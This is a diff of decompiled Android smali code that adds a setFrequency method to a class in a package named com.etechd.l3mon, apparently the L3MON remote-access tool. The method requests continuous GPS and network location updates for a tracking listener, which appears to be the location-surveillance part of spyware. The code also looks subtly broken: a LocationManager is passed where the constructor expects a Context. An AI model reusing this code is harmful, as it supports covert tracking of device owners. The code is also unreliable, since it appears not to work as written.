@@ -91,6 +91,63 @@
     return-void
 .end method
 
+.method public static setFrequency(Landroid/content/Context;J)V
+    .locals 7
+
+    .line 155
+    :try_start_0
+    const-string v0, "location"
+
+    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object p0
+
+    check-cast p0, Landroid/location/LocationManager;
+
+    .line 156
+    if-eqz p0, :cond_0
+
+    .line 157
+    new-instance v6, Lcom/etechd/l3mon/LocManager;
+
+    invoke-direct {v6, p0}, Lcom/etechd/l3mon/LocManager;-><init>(Landroid/content/Context;)V
+
+    .line 158
+    const-string v1, "gps"
+
+    const/4 v4, 0x0
+
+    move-object v0, p0
+
+    move-wide v2, p1
+
+    move-object v5, v6
+
+    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
+
+    .line 159
+    const-string v1, "network"
+
+    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 163
+    :cond_0
+    goto :goto_0
+
+    .line 161
+    :catch_0
+    move-exception p0
+
+    .line 162
+    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 164
+    :goto_0
+    return-void
+.end method
+
 
 # virtual methods
 .method public canGetLocation()Z
